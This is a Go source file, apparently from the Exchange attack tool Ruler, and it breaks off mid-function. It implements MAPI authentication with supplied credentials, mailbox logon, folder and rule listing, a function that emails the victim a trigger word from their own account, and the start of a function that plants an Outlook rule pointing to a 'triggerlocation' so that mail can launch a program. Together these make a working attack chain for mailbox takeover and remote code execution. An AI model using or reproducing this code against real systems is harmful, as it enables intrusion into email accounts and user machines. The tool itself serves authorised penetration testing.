package mapi

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"

	"github.com/sensepost/ruler/http-ntlm"
	"github.com/sensepost/ruler/rpc-http"
	"github.com/sensepost/ruler/utils"
)

//HTTP transport type for MAPI over HTTP types
const HTTP int = 1

//RPC over HTTP transport type for traditional MAPI
const RPC int = 2

//AuthSession a
var AuthSession utils.Session

//ExtractMapiURL extract the External mapi url from the autodiscover response
func ExtractMapiURL(resp *utils.AutodiscoverResp) string {
	for _, v := range resp.Response.Account.Protocol {
		if v.TypeAttr == "mapiHttp" {
			return v.MailStore.ExternalUrl
		}
	}
	return ""
}

//ExtractRPCURL extract the External RPC url from the autodiscover response
func ExtractRPCURL(resp *utils.AutodiscoverResp) string {
	for _, v := range resp.Response.Account.Protocol {
		if v.TypeAttr == "rpcHttp" {
			return v.MailStore.ExternalUrl
		}
	}
	return ""
}

//Init is used to start our mapi session
func Init(config utils.Config, lid, URL string, transport int) {
	AuthSession.User = config.User
	AuthSession.Pass = config.Pass
	AuthSession.Email = config.Email
	AuthSession.Insecure = config.Insecure
	AuthSession.LID = lid
	AuthSession.CookieJar, _ = cookiejar.New(nil)
	if transport == HTTP {
		AuthSession.URL, _ = url.Parse(URL)
	} else {
		AuthSession.Host = URL
	}
	AuthSession.Transport = transport
	AuthSession.ClientSet = false
	AuthSession.ReqCounter = 1
	AuthSession.LogonID = 0x04
	AuthSession.Authenticated = false
	AuthSession.Admin = config.Admin
}

func addMapiHeaders(req *http.Request, mapiType string) {
	AuthSession.ReqCounter++
	req.Header.Add("Content-Type", "application/mapi-http")
	req.Header.Add("X-RequestType", mapiType)
	req.Header.Add("X-User-Identity", AuthSession.Email)
	req.Header.Add("X-RequestId", fmt.Sprintf("{C715155F-2BE8-44E0-BD34-2960065754C8}:%d", AuthSession.ReqCounter))
	req.Header.Add("X-ClientInfo", "{2F94A2BF-A2E6-4CCC-BF98-B5F22C542226}")
	req.Header.Add("X-ClientApplication", "Outlook/15.0.4815.1002")
}

func addRPCHeaders(req *http.Request) {
	AuthSession.ReqCounter++
	req.Header.Set("User-Agent", "MSRPC")
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Add("Accept", "application/rpc")
	req.Header.Add("Content-length", "0")

}

//mapiAuthRequest connects and authenticates using NTLM or basic auth.
//After the authentication is complete, we can simply use the mapiRequest
//and the session cookies.
func mapiRequestHTTP(URL, mapiType string, body []byte) (*http.Response, []byte) {
	if AuthSession.ClientSet == false {
		AuthSession.Client = http.Client{
			Transport: &httpntlm.NtlmTransport{
				Domain:   "",
				User:     AuthSession.User,
				Password: AuthSession.Pass,
				Insecure: AuthSession.Insecure,
			},
			Jar: AuthSession.CookieJar,
		}
		AuthSession.ClientSet = true
	}

	req, err := http.NewRequest("POST", URL, bytes.NewReader(body))
	addMapiHeaders(req, mapiType)
	req.SetBasicAuth(AuthSession.Email, AuthSession.Pass)
	//request the auth url
	resp, err := AuthSession.Client.Do(req)

	if err != nil {
		//check if this error was because of ntml auth when basic auth was expected.
		if m, _ := regexp.Match("illegal base64", []byte(err.Error())); m == true {
			AuthSession.Client = http.Client{Jar: AuthSession.CookieJar}
			resp, err = AuthSession.Client.Do(req)
		} else {
			fmt.Println(err)
			return nil, nil
		}
	}
	rbody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return nil, nil
	}
	return resp, rbody
}

//mapiRequestRPC to our target. Takes the mapiType (Connect, Execute) to determine the
//action performed on the server side
func mapiRequestRPC(body []byte) (*http.Response, []byte) {
	var URL = "http://mail.evilcorp.ninja/rpc/rpcproxy.dll?7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja:6001"
	if AuthSession.RPCSet == false {
		var err error
		rpchttp.AuthSession = &AuthSession
		if err = rpchttp.RPCOpen(rpchttp.RPCIN, URL); err != nil {
			return nil, nil
		}
		if err = rpchttp.RPCOpen(rpchttp.RPCOUT, URL); err != nil {
			return nil, nil
		}
		rpchttp.RPCAuth()
		AuthSession.RPCSet = true
	}
	return nil, nil
}

//isAuthenticated checks if we have a session
func isAuthenticated() {
	if AuthSession.CookieJar.Cookies(AuthSession.URL) == nil {
		fmt.Println("[x] No authentication cookies found. You may not be authenticated.")
		fmt.Println("[*] Trying to authenticate you")
		Authenticate()
	}
}

func specialFolders(folderResponse []byte) {
	AuthSession.Folderids = make([][]byte, 13)
	cnt := 0
	for k := 0; k < 13; k++ {
		AuthSession.Folderids[k] = folderResponse[cnt : cnt+8]
		//fmt.Printf("%d : %x\n", k, AuthSession.Folderids[k])
		cnt += 8
	}
}

func readResponse(headers http.Header, body []byte) ([]byte, error) {
	//check to see that the response code was 0, which indicates protocol success
	if headers.Get("X-ResponseCode") != "0" {
		//fmt.Println(string(body))
		return nil, fmt.Errorf("Got a protocol error response: %s", headers.Get("X-ResponseCode"))
	}
	//We need to parse out the body to get rid of the meta-tags and additional headers (if any)
	// <META-TAGS>
	// <ADDITIONAL HEADERS>
	// <RESPONSE BODY>
	//we need to check the meta-tags to see if it is PROCESSING, PENDING or DONE
	//DONE means we don't need to fetch more data
	start := bytes.Index(body, []byte{0x0D, 0x0A, 0x0D, 0x0A})
	return body[start+4:], nil
}

//Authenticate is used to create the MAPI session, get's session cookie ect
func Authenticate() (*RopLogonResponse, error) {
	connRequest := ConnectRequest{}

	connRequest.UserDN = []byte(AuthSession.LID)
	connRequest.UserDN = append(connRequest.UserDN, []byte{0x00}...) //append nullbyte
	if AuthSession.Admin == true {
		connRequest.Flags = uFlagsAdmin
	} else {
		connRequest.Flags = uFlagsUser
	}
	connRequest.DefaultCodePage = 1252
	connRequest.LcidSort = 2057
	connRequest.LcidString = 1033

	if AuthSession.Transport == HTTP {
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Connect", connRequest.Marshal())

		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		connResponse := ConnectResponse{}
		connResponse.Unmarshal(responseBody)

		if connResponse.StatusCode == 0 {
			fmt.Println("[+] User DN: ", string(connRequest.UserDN))
			fmt.Println("[*] Got Context, Doing ROPLogin")

			AuthSession.UserDN = connRequest.UserDN
			return AuthenticateFetchMailbox(connRequest.UserDN)
		}
		return nil, fmt.Errorf("[x]Authentication failed with non-zero status code")
	} else if AuthSession.Transport == RPC {
		mapiRequestRPC(connRequest.Marshal())
	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//AuthenticateFetchMailbox func to perform step two of the authentication process
func AuthenticateFetchMailbox(essdn []byte) (*RopLogonResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	logonBody := RopLogonRequest{RopID: 0xFE, LogonID: AuthSession.LogonID}
	logonBody.OutputHandleIndex = 0x00
	logonBody.LogonFlags = 0x01
	if AuthSession.Admin == true {
		logonBody.OpenFlags = UseAdminPrivilege | TakeOwnership | UserPerMdbReplidMapping
	} else {
		logonBody.OpenFlags = UserPerMdbReplidMapping | HomeLogon | TakeOwnership //[]byte{0x0C, 0x04, 0x00, 0x21}
	}
	logonBody.StoreState = 0x00000000
	logonBody.Essdn = essdn
	logonBody.EssdnSize = uint16(len(logonBody.Essdn))
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = logonBody.Marshal()

	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)

		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)
		if execResponse.ErrorCode == 0 && len(execResponse.RopBuffer) > 0 {
			AuthSession.Authenticated = true

			logonResponse := RopLogonResponse{}
			logonResponse.Unmarshal(execResponse.RopBuffer)
			specialFolders(logonResponse.FolderIds)
			return &logonResponse, nil
		}
		if AuthSession.Admin {
			return nil, fmt.Errorf("[x] Invalid logon. Admin privileges requested but user is not admin")
		}
	}
	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//Disconnect function to be nice and disconnect us from the server
//This is strictly necessary but hey... lets follow protocol
func Disconnect() (int, error) {
	fmt.Println("[*] And disconnecting from server")
	execRequest := ExecuteRequest{}
	execRequest.Init()
	disconnectBody := DisconnectRequest{}
	disconnectBody.AuxilliaryBufSize = 0

	if AuthSession.Transport == HTTP {
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Disconnect", disconnectBody.Marshal())
		_, err := readResponse(resp.Header, rbody)
		if err != nil {
			return -1, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
	}
	return 0, nil
}

//ReleaseObject issues a RopReleaseRequest to free a server handle to an object
func ReleaseObject(inputHandle byte) (*RopReleaseResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()
	ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: inputHandle}
	fullReq := ropRelease.Marshal()
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq
	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)

		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		if execResponse.ErrorCode == 0 {
			ropReleaseResponse := RopReleaseResponse{}
			_, err = ropReleaseResponse.Unmarshal(execResponse.RopBuffer[10:])
			if err != nil {
				return nil, err
			}
			return &ropReleaseResponse, nil
		}
	}
	return nil, fmt.Errorf("[x] Unknown error occurred or empty response")
}

//SendMessage func to create a new message on the Exchange server
//and then sends an email to the target using their own email
func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	createMessage := RopCreateMessageRequest{RopID: 0x06, LogonID: AuthSession.LogonID}
	createMessage.InputHandle = 0x00
	createMessage.OutputHandle = 0x01
	createMessage.FolderID = AuthSession.Folderids[OUTBOX]
	createMessage.CodePageID = 0xFFF
	createMessage.AssociatedFlag = 0

	fullReq := createMessage.Marshal()

	setProperties := RopSetPropertiesRequest{RopID: 0x0A, LogonID: AuthSession.LogonID}
	setProperties.InputHandle = 0x01
	setProperties.PropertValueCount = 8

	propertyTags := make([]TaggedPropertyValue, setProperties.PropertValueCount)
	propertyTags[0] = TaggedPropertyValue{PidTagBody, UniString("This is the body.\n\r")}
	propertyTags[1] = PidTagMessageClass
	propertyTags[2] = TaggedPropertyValue{PidTagMessageFlags, []byte{0x00, 0x00, 0x00, 0x08}} //unsent
	propertyTags[3] = TaggedPropertyValue{PidTagConversationTopic, UniString(triggerWord)}
	propertyTags[4] = PidTagIconIndex
	propertyTags[5] = PidTagMessageEditorFormat
	propertyTags[5] = TaggedPropertyValue{PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
	propertyTags[6] = TaggedPropertyValue{PidTagSubject, UniString(triggerWord)}
	propertyTags[7] = TaggedPropertyValue{PidTagNormalizedSubject, UniString(triggerWord)}

	setProperties.PropertyValues = propertyTags
	propertySize := 0
	for _, p := range propertyTags {
		propertySize += len(BodyToBytes(p))
	}

	setProperties.PropertValueSize = uint16(propertySize + 2)

	fullReq = append(fullReq, setProperties.Marshal()...)

	modRecipients := RopModifyRecipientsRequest{RopID: 0x0E, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	modRecipients.ColumnCount = 8
	modRecipients.RecipientColumns = make([]PropertyTag, modRecipients.ColumnCount)

	modRecipients.RecipientColumns[0] = PidTagObjectType
	modRecipients.RecipientColumns[1] = PidTagDisplayType
	//modRecipients.RecipientColumns[2] = PidTagSMTPAddress
	modRecipients.RecipientColumns[2] = PidTagEmailAddress
	modRecipients.RecipientColumns[3] = PidTagSendInternetEncoding
	modRecipients.RecipientColumns[4] = PidTagDisplayTypeEx
	modRecipients.RecipientColumns[5] = PidTagRecipientDisplayName
	modRecipients.RecipientColumns[6] = PidTagRecipientFlags
	modRecipients.RecipientColumns[7] = PidTagRecipientTrackStatus

	modRecipients.RowCount = 0x0001

	modRecipients.RecipientRows = make([]ModifyRecipientRow, modRecipients.RowCount)
	modRecipients.RecipientRows[0] = ModifyRecipientRow{RowID: 0x00000001, RecipientType: 0x00000001}
	modRecipients.RecipientRows[0].RecipientRow = RecipientRow{}
	modRecipients.RecipientRows[0].RecipientRow.RecipientFlags = 0x0008 | 0x0003 | 0x0200 | 0x0010 | 0x3 | 0x0020 //| 0x0040 //| 0x0010 // | (0x1) | 0x0400 | 0x0200 //0x0651 //0x0040 | 0x0010 | 0x1007 | 0x0400 | 0x0100 //email address and display name
	//modRecipients.RecipientRows[0].RecipientRow.AddressPrefixUsed = 0x5A
	//modRecipients.RecipientRows[0].RecipientRow.DisplayType = 0x00
	modRecipients.RecipientRows[0].RecipientRow.EmailAddress = UniString(AuthSession.Email) //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.DisplayName = UniString("Self")             //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.SimpleDisplayName = UniString("Self")       //email address and display name
	modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount = modRecipients.ColumnCount

	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties = StandardPropertyRow{Flag: 0x00}

	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray = make([][]byte, modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount)
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[0] = []byte{0x06, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[1] = []byte{0x00, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[2] = UniString(AuthSession.Email)
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[3] = []byte{0x00, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[4] = []byte{0x00, 0x00, 0x00, 0x40}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[5] = UniString("Self")
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[6] = []byte{0x01, 0x00, 0x00, 0x00}
	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[7] = []byte{0x00, 0x00, 0x00, 0x00}

	modRecipients.RecipientRows[0].RecipientRowSize = uint16(len(BodyToBytes(modRecipients.RecipientRows[0].RecipientRow)))
	fullReq = append(fullReq, modRecipients.Marshal()...)

	//submitMessage := RopSubmitMessageRequest{RopID: 0x32, LogonID: AuthSession.LogonID, InputHandle: 0x02, SubmitFlags: 0x00}
	//fullReq = append(fullReq, submitMessage.Marshal()...)
	submitMessage := RopSubmitMessageRequest{RopID: 0x32, LogonID: AuthSession.LogonID, InputHandle: 0x01, SubmitFlags: 0x00}
	fullReq = append(fullReq, submitMessage.Marshal()...)
	/*
		saveMessage := RopSaveChangesMessageRequest{RopID: 0x0C, LogonID: AuthSession.LogonID}
		saveMessage.ResponseHandleIndex = 0x02
		saveMessage.InputHandle = 0x01
		saveMessage.SaveFlags = 0x02

		fullReq = append(fullReq, saveMessage.Marshal()...)
	*/
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)

		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		if execResponse.ErrorCode == 0 {

			bufPtr := 10

			createMessageResponse := RopCreateMessageResponse{}

			p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
			if e != nil {
				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
			}
			bufPtr += p

			propertiesResponse := RopSetPropertiesResponse{}
			p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
			if e != nil {
				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
			}

			bufPtr += p
			modRecipients := RopModifyRecipientsResponse{}
			p, e = modRecipients.Unmarshal(execResponse.RopBuffer[bufPtr:])
			bufPtr += p
			if e != nil {
				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
			}

			submitMessageResp := RopSubmitMessageResponse{}
			_, err = submitMessageResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
			if err != nil {
				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
			}

			return &submitMessageResp, nil
		}
	}

	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//CreateMessage is used to create a message on the exchange server
func CreateMessage(folderID []byte) (*RopSaveChangesMessageResponse, error) {
	execRequest := ExecuteRequest{}
	execRequest.Init()

	createMessage := RopCreateMessageRequest{RopID: 0x06, LogonID: AuthSession.LogonID}
	createMessage.InputHandle = 0x00
	createMessage.OutputHandle = 0x01
	createMessage.FolderID = folderID
	createMessage.CodePageID = 0xFFF
	createMessage.AssociatedFlag = 0

	fullReq := createMessage.Marshal()

	saveMessage := RopSaveChangesMessageRequest{RopID: 0x0C, LogonID: AuthSession.LogonID}
	saveMessage.ResponseHandleIndex = 0x02
	saveMessage.InputHandle = 0x01
	saveMessage.SaveFlags = 0x02

	fullReq = append(fullReq, saveMessage.Marshal()...)

	//ropRelease := RopReleaseRequest{RopID: 0x01, LogonID: AuthSession.LogonID, InputHandle: 0x01}
	//fullReq = append(fullReq, ropRelease.Marshal()...)
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	execRequest.RopBuffer.ROP.RopsList = fullReq

	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)

		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		if execResponse.ErrorCode == 0 {
			bufPtr := 10

			createMessageResponse := RopCreateMessageResponse{}

			p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
			if e != nil {
				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
			}
			bufPtr += p

			saveMessageResponse := RopSaveChangesMessageResponse{}
			saveMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])

			if err != nil {
				return nil, err
			}

			return &saveMessageResponse, nil

		}
	}
	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
}

//GetContentsTable function get's a folder from the folders id
func GetContentsTable() (*RopGetContentsTableResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	getContents := RopGetContentsTableRequest{RopID: 0x05, LogonID: AuthSession.LogonID, InputHandleIndex: 0x00, OutputHandleIndex: 0x01, TableFlags: 0x02}
	setColumns := RopSetColumnsRequest{RopID: 0x12, LogonID: AuthSession.LogonID, InputHandle: 0x01, SetColumnFlags: 0x00, PropertyTagCount: 0x0006}

	propertyTags := make([]PropertyTag, setColumns.PropertyTagCount)
	propertyTags[0] = PropertyTag{PtypInteger64, 0x4867}
	propertyTags[1] = PropertyTag{PtypInteger64, 0x4a67}
	propertyTags[2] = PropertyTag{PtypInteger64, 0x4d67}
	propertyTags[3] = PropertyTag{PtypInteger32, 0x4e67}
	propertyTags[4] = PropertyTag{PtypString, 0x1a00}
	propertyTags[5] = PropertyTag{PtypTime, 0x0830}

	setColumns.PropertyTags = propertyTags
	//0x14, AuthSession.LogonID, 0x01, 0x00, 0x2e, 0x00, 0x04, 0x04, 0x1f, 0x00, 0x1a, 0x00, 0x1f, 0x00, 0x1a, 0x00, 0x49, 0x00, 0x50, 0x00, 0x4d, 0x00, 0x2e, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x4f, 0x00, 0x72, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6e, 0x00, 0x69, 0x00, 0x7a, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x13, AuthSession.LogonID, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x08, 0x30, 0x01
	//restrict := RopRestrictRequest{RopID: 0x14, LogonID: AuthSession.LogonID, InputHandle: 0x01, RestrictFlags: 0x00, RestrictDataSize: 0x002e}
	//getContents = append(getContents.Marshal(), []byte{0x12, AuthSession.LogonID, 0x01, 0x00, 0x06, 0x00, 0x14, 0x00, 0x48, 0x67, 0x14, 0x00, 0x4a, 0x67, 0x14, 0x00, 0x4d, 0x67, 0x03, 0x00, 0x4e, 0x67, 0x1f, 0x00, 0x1a, 0x00, 0x40, 0x00, 0x08, 0x30, 0x14, AuthSession.LogonID, 0x01, 0x00, 0x2e, 0x00, 0x04, 0x04, 0x1f, 0x00, 0x1a, 0x00, 0x1f, 0x00, 0x1a, 0x00, 0x49, 0x00, 0x50, 0x00, 0x4d, 0x00, 0x2e, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x4f, 0x00, 0x72, 0x00, 0x67, 0x00, 0x61, 0x00, 0x6e, 0x00, 0x69, 0x00, 0x7a, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x13, AuthSession.LogonID, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x08, 0x30, 0x01, 0x18, AuthSession.LogonID, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x15, AuthSession.LogonID, 0x01, 0x02, 0x01, 0x00, 0x10}...)

	execRequest.RopBuffer.ROP.RopsList = append(getContents.Marshal())
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch contents
	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}

		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)
		if execResponse.StatusCode != 0 {
			return nil, fmt.Errorf("[x] Status code > 0. Error occurred")

		}
		ropContents := RopGetContentsTableResponse{}
		ropContents.Unmarshal(execResponse.RopBuffer)
		return &ropContents, nil

	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//GetFolder function get's a folder from the folders id
//FolderIds can be any of the "specialFolders" as defined in Exchange
//mapi/datastructs.go folder id/locations constants
func GetFolder(folderid int, columns []PropertyTag) (*ExecuteResponse, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	getFolder := RopOpenFolderRequest{RopID: 0x02, LogonID: AuthSession.LogonID}
	getFolder.InputHandle = 0x00
	getFolder.OutputHandle = 0x01
	getFolder.FolderID = AuthSession.Folderids[folderid]
	getFolder.OpenModeFlags = 0x00

	var k []byte

	if columns != nil {
		getProperties := RopGetPropertiesSpecific{}
		getProperties.RopID = 0x07
		getProperties.LogonID = AuthSession.LogonID
		getProperties.InputHandle = 0x01
		getProperties.PropertySizeLimit = 0x00
		getProperties.WantUnicode = []byte{0x00, 0x01}
		getProperties.PropertyTagCount = uint16(len(columns))
		getProperties.PropertyTags = columns

		k = append(getFolder.Marshal(), getProperties.Marshal()...)

	} else {
		k = getFolder.Marshal()
	}

	execRequest.RopBuffer.ROP.RopsList = k
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		return &execResponse, nil

	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//DisplayRules function get's a folder from the folders id
func DisplayRules() ([]Rule, error) {

	execRequest := ExecuteRequest{}
	execRequest.Init()

	getRulesFolder := RopGetRulesRequest{RopID: 0x3f, LogonID: AuthSession.LogonID, InputHandleIndex: 0x00, OutputHandleIndex: 0x01, TableFlags: 0x40}
	//RopSetColumns
	setColumns := RopSetColumnsRequest{RopID: 0x12, LogonID: AuthSession.LogonID}
	setColumns.InputHandle = 0x01
	setColumns.PropertyTagCount = 0x02
	setColumns.PropertyTags = make([]PropertyTag, 2)
	setColumns.PropertyTags[0] = PidTagRuleID
	setColumns.PropertyTags[1] = PidTagRuleName

	//RopQueryRows
	queryRows := RopQueryRowsRequest{RopID: 0x15, LogonID: AuthSession.LogonID, InputHandle: 0x01, QueryRowsFlags: 0x00, ForwardRead: 0x01, RowCount: 0x32}

	getRules := append(getRulesFolder.Marshal(), setColumns.Marshal()...)
	getRules = append(getRules, queryRows.Marshal()...)

	execRequest.RopBuffer.ROP.RopsList = getRules
	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x01, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}

	//fetch folder
	if AuthSession.Transport == HTTP { // HTTP
		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
		responseBody, err := readResponse(resp.Header, rbody)
		if err != nil {
			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
		}
		execResponse := ExecuteResponse{}
		execResponse.Unmarshal(responseBody)

		rules, _ := DecodeRulesResponse(execResponse.RopBuffer, setColumns.PropertyTags)
		if rules == nil {
			return nil, fmt.Errorf("[x] Error retrieving rules")
		}
		return rules, nil

	}
	return nil, fmt.Errorf("[x] An Unspecified error occurred")
}

//ExecuteMailRuleAdd adds a new mailrules
func ExecuteMailRuleAdd(rulename, triggerword, triggerlocation string, delete bool) (*ExecuteResponse, error) {
	//valid
	var delbit byte = 0x04
	if delete == true {
		delbit = 0x06
	}
	execRequest := ExecuteRequest{}
	execRequest.Init()
	execRequest.MaxRopOut = 262144

	addRule := RopModifyRulesRequest{RopID: 0x41, LoginID: AuthSession.LogonID, InputHandleIndex: 0x00, ModifyRulesFlag: 0x00, RulesCount: 0x01, RuleData: RuleData{RuleDataFlags: 0x01}}

	propertyValues := make([]TaggedPropertyValue, 8)
	//RUle Name
	propertyValues[0] = TaggedPropertyValue{PidTagRuleName, UniString(rulename)}
	//PidTagRuleSequence
	propertyValues[1] = TaggedPropertyValue{PidTagRuleSequence, []byte{0x0A, 0x00, 0x00, 0x00}}
	//PidTagRuleState (Enabled)
	propertyValues[2] = TaggedPropertyValue{PidTagRuleState, []byte{0x01, 0x00, 0x00, 0x00}}
	//PidTagRuleCondition
	propertyValues[3] = TaggedPropertyValue{PidTagRuleCondition, BodyToBytes(RuleCondition{0x03, []byte{0x01, 0x00, 0x01, 0x00}, []byte{0x1F, 0x00, 0x37, 0x00, 0x1f, 0x00, 0x37, 0x00}, UniString(triggerword)})}
	//PidTagRuleActions

	actionData := ActionData{}
	actionData.ActionElem = []byte{0x00, 0x00, 0x14}
	actionData.ActionName = UTF16BE(rulename, 1)
	actionData.Element = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xa8, 0x00, 0x00, 0x00, delbit, 0x00, 0xff, 0xff, 0x00, 0x00, 0x0c, 0x00, 0x43, 0x52, 0x75, 0x6c, 0x65, 0x45, 0x6c, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x90, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0x64, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x80, 0xcd, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	actionData.Triggger = UTF16BE(triggerword, 1)
	actionData.Elem = []byte{0x80, 0x49, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	actionData.EndPoint = append(UTF16BE(triggerlocation, 1), []byte{0x80, 0x4a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)

